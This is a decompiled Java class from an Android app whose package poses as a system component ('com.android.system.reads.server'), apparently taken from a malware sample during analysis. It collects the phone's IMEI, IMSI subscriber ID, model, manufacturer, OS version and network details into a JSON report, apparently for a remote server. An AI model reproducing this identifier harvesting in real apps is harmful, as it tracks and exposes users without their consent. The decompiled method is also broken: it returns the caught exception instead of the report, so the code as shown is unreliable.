package com.android.system.reads.server;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import com.android.system.reads.b.a;
import org.json.JSONException;
import org.json.JSONObject;

public final class e {
  private static int a(Context paramContext, String paramString) {
    return paramContext.getSharedPreferences(paramContext.getPackageName(), 0).getInt(paramString, 0);
  }
  
  public static String a(Context paramContext) {
    JSONObject jSONObject = new JSONObject();
    try {
      boolean bool;
      jSONObject.put("imei", ((TelephonyManager)paramContext.getSystemService("phone")).getDeviceId());
      jSONObject.put("imsi", ((TelephonyManager)paramContext.getSystemService("phone")).getSubscriberId());
      jSONObject.put("osver", Build.VERSION.RELEASE);
      jSONObject.put("mbltag", paramContext.getPackageName());
      jSONObject.put("model", Build.MODEL);
      jSONObject.put("manufac", Build.MANUFACTURER);
      jSONObject.put("version", "2");
      jSONObject.put("network_type", com.android.system.reads.b.e.a(paramContext));
      if (a.a()) {
        bool = true;
      } else {
        bool = false;
      } 
      jSONObject.put("is_service", bool);
      if (a()) {
        bool = true;
      } else {
        bool = false;
      } 
      jSONObject.put("sd_card", bool);
      jSONObject.put("ap_id", a(paramContext, "reads_app_id"));
      jSONObject.put("ap_status", a(paramContext, "reads_app_status"));
      String str = jSONObject.toString();
    } catch (JSONException jSONException) {
      jSONException.printStackTrace();
      jSONException = null;
    } 
    return (String)jSONException;
  }
  
  public static void a(Context paramContext, int paramInt1, int paramInt2) {
    a(paramContext, "reads_app_id", paramInt1);
    a(paramContext, "reads_app_status", paramInt2);
  }
  
  private static void a(Context paramContext, String paramString, int paramInt) {
    SharedPreferences.Editor editor = paramContext.getSharedPreferences(paramContext.getPackageName(), 0).edit();
    editor.putInt(paramString, paramInt);
    editor.commit();
  }
  
  public static boolean a() {
    return Environment.getExternalStorageState().equals("mounted");
  }
}


/* Location:              /home/fahim/Desktop/BreakBottleNeckOmigo-dex2jar.jar!/com/android/system/reads/server/e.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */